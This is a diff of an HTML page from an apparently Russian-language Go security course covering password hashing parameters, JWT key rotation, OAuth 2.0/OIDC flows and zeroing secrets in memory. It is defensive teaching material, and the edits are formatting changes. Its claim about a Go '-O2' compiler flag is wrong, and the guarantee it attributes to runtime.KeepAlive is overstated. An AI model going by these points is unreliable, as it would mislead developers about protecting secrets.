 <p style="margin-bottom: 6px;">| <strong>Устойчивость к ASIC</strong> | Низкая | Средняя | Высокая | <strong>Максимальная</strong> |</p>
 <p style="margin-bottom: 6px;">| <strong>Макс. длина пароля</strong> | <strong>72 байта</strong> | <strong>72 байта</strong> | Без ограничений | Без ограничений |</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Критерии выбора параметров для интерактивной аутентификации:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Критерии выбора параметров для интерактивной аутентификации:</h5>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Для стандартных микросервисов:</strong> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Argon2id (Memory=64MB, Iterations=3, Parallelism=4)</code>. Обеспечивает наивысший уровень защиты OWASP при задержке ~200 мс.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Для контейнеров с жесткими лимитами памяти (Pods с RAM < 512MB):</strong> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Argon2id (Memory=19MB, Iterations=2, Parallelism=1)</code>. Потребляет втрое меньше RAM, предотвращая срабатывание OOM-Killer.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Для контейнеров с жесткими лимитами памяти (Pods с RAM &lt; 512MB):</strong> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Argon2id (Memory=19MB, Iterations=2, Parallelism=1)</code>. Потребляет втрое меньше RAM, предотвращая срабатывание OOM-Killer.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Для легаси систем с ограничениями по библиотекам:</strong> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt (Cost=12)</code> с обязательным pre-hashing через SHA-256.</div></div>
   </div>
   <div style="margin: 18px 0 10px;">
@@ -9307,7 +9275,7 @@ func main() {
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования в Ozon/Т-Банк:</strong> «Как выбрать между bcrypt и Argon2id для нового финтех-сервиса с требованиями PCI-DSS?»</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> По актуальным стандартам PCI-DSS v4.0 и рекомендациям OWASP:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Выбор по умолчанию:</strong> <strong>Argon2id</strong> с параметрами $m=64\text{MB}, t=3, p=4$. Он гарантирует устойчивость к перебору на видеокартах и заказных чипах ASIC благодаря требованию к оперативной памяти.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Исключение:</strong> Если бэкенд развернут в жестко ограниченных микроконтейнерах (RAM < 256MB) или на микроконтроллерах, где аллокация 64 МБ приведет к OOM-сбою, используется <strong>bcrypt (cost=12)</strong> с обязательным предварительным SHA-256 хэшированием пароля (pre-hashing для обхода лимита в 72 байта).</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Исключение:</strong> Если бэкенд развернут в жестко ограниченных микроконтейнерах (RAM &lt; 256MB) или на микроконтроллерах, где аллокация 64 МБ приведет к OOM-сбою, используется <strong>bcrypt (cost=12)</strong> с обязательным предварительным SHA-256 хэшированием пароля (pre-hashing для обхода лимита в 72 байта).</div></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-53">
@@ -9327,7 +9295,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Компрометация ключа позволяет злоумышленнику бессрочно подделывать токены любых пользователей до ручной перенастройки всей инфраструктуры.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Внезапная смена ключа мгновенно разлогинивает миллионы активных пользователей, вызывая шквал повторных запросов аутентификации.</div>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектура Graceful Key Rotation (Кольцо ключей):</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектура Graceful Key Rotation (Кольцо ключей):</h5>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;">Каждому ключу присваивается уникальный идентификатор: <strong>Key ID (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">kid</code>)</strong>.</li>
 <li style="margin-bottom: 4px;">Сервер хранит <strong>Key Ring (набор ключей)</strong>:</li>
@@ -9554,7 +9522,7 @@ func main() {
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">Протокол <strong>OAuth 2.0 (RFC 6749)</strong> — общепринятый мировой стандарт делегированной авторизации. Самым надежным и защищенным сценарием для серверных веб-приложений является <strong>Authorization Code Flow</strong>:</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектурный поток (Workflow):</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектурный поток (Workflow):</h5>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Инициация (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/login</code>):</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;">Сервер генерирует криптографически стойкую псевдослучайную строку <strong><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">state</code></strong> (минимум 128 бит энтропии).</li>
@@ -9567,7 +9535,7 @@ func main() {
 </ul>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Обмен кода (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/callback</code>):</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
-<li style="margin-bottom: 4px;">Провайдер возвращает пользователя на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/callback?code=...&state=...</code>.</li>
+<li style="margin-bottom: 4px;">Провайдер возвращает пользователя на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/callback?code=...&amp;state=...</code>.</li>
 <li style="margin-bottom: 4px;">Сервер проверяет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cookie.state == query.state</code>.</li>
 <li style="margin-bottom: 4px;">Сервер бэкенда напрямую (Back-Channel HTTP POST) связывается с провайдером и обменивает временный одноразовый <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">code</code> на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">AccessToken</code> (и опциональный <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">RefreshToken</code>).</li>
 </ul></div>
@@ -9785,7 +9753,7 @@ func main() {
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">В то время как <strong>OAuth 2.0</strong> предназначен строго для <strong>авторизации</strong> (делегирования прав доступа к API), стандарт <strong>OpenID Connect (OIDC)</strong> расширяет его для задач <strong>аутентификации</strong> (подтверждения личности пользователя).</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Ключевые компоненты OIDC:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Ключевые компоненты OIDC:</h5>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>OIDC Discovery (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">.well-known/openid-configuration</code>):</strong> Сервер приложений делает один HTTP GET-запрос к провайдеру (Google, Keycloak, Auth0, Яндекс ID) и автоматически узнает URL эндпоинтов авторизации, обмена токенов и JWKS.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>JWKS (JSON Web Key Sets):</strong> Эндпоинт, публикующий актуальные публичные ключи провайдера. Библиотека <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">go-oidc</code> кэширует их и автоматически обновляет при ротации.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>ID Token (JWT):</strong> Подписанный токен идентификации, содержащий утверждения (<strong>claims</strong>) о пользователе:</div>
@@ -9927,7 +9895,7 @@ func main() {
   </div>
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
-    <div><p style="margin-bottom: 6px;">В библиотеке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">github.com/coreos/go-oidc/v3/oidc</code> метод <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">provider.Verifier(&oidc.Config{ClientID: ...})</code> создает структуру <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">IDTokenVerifier</code>.</p>
+    <div><p style="margin-bottom: 6px;">В библиотеке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">github.com/coreos/go-oidc/v3/oidc</code> метод <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">provider.Verifier(&amp;oidc.Config{ClientID: ...})</code> создает структуру <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">IDTokenVerifier</code>.</p>
 <p style="margin-bottom: 6px;">При вызове <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">verifier.Verify(ctx, rawToken)</code>:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Парсится JWT заголовок, извлекается <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">kid</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Библиотека находит соответствующий RSA/ECDSA публичный ключ в кэше JWKS (скачанном из эндпоинта <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">jwks_uri</code>).</div>
@@ -9969,12 +9937,10 @@ func main() {
 <li style="margin-bottom: 4px;">При атаках через соседние процессы (например, уязвимости Spectre/Meltdown, чтение <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/proc/$PID/mem</code>) злоумышленник с повышенными правами может извлечь открытые секреты из памяти.</li>
 </ul>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Отраслевой стандарт DevSecOps: Zeroing Memory</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Отраслевой стандарт DevSecOps: Zeroing Memory</h5>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Все чувствительные данные (пароли, seed-фразы, мастер-ключи шифрования) обязаны приниматься и обрабатываться исключительно в виде <strong>изменяемого среза байт <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">[]byte</code></strong>, а не <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">string</code>!</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Сразу после использования срез <strong>принудительно затирается нулями</strong>:</div>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">for i := range secretBytes { secretBytes[i] = 0 }</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">   for i := range secretBytes { secretBytes[i] = 0 }</code></pre></div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Защита от оптимизатора компилятора (DCE — Dead Code Elimination):</strong></div>
 <p style="margin-bottom: 6px;">Компилятор Go при агрессивной оптимизации (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">-O2</code> / SSA pass) может заметить, что массив <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">secretBytes</code> больше нигде не читается после цикла зануления, и <strong>полностью удалить цикл затирания из ассемблерного кода</strong>!</p>
 <p style="margin-bottom: 6px;">Чтобы гарантировать затирание, применяют <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">runtime.KeepAlive(secretBytes)</code> или барьеры памяти.</p></div>
@@ -10103,7 +10069,7 @@ func main() {
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Преобразование <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">string([]byte)</code>:</strong> Вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">s := string(passwordBytes)</code> создает в куче неизменяемую копию строки, которую невозможно затереть! Никогда не приводите секретные байты к <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">string</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Игнорирование системного вызова <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">mlock</code>:</strong> В Linux страницы памяти могут быть сброшены на диск в раздел подкачки (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">swap</code>). Для банковских и криптографических систем критические страницы блокируют в физической RAM через системный вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">unix.Mlock</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Логирование структур с секретами:</strong> Передача структуры с секретным срезом в <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">log.Printf("%+v", creds)</code> приведет к утечке секрета в ELK/stdout. Реализуйте интерфейс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Stringer</code> для сокрытия полей.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Логирование структур с секретами:</strong> Передача структуры с секретным срезом в <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">log.Printf(&quot;%+v&quot;, creds)</code> приведет к утечке секрета в ELK/stdout. Реализуйте интерфейс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Stringer</code> для сокрытия полей.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
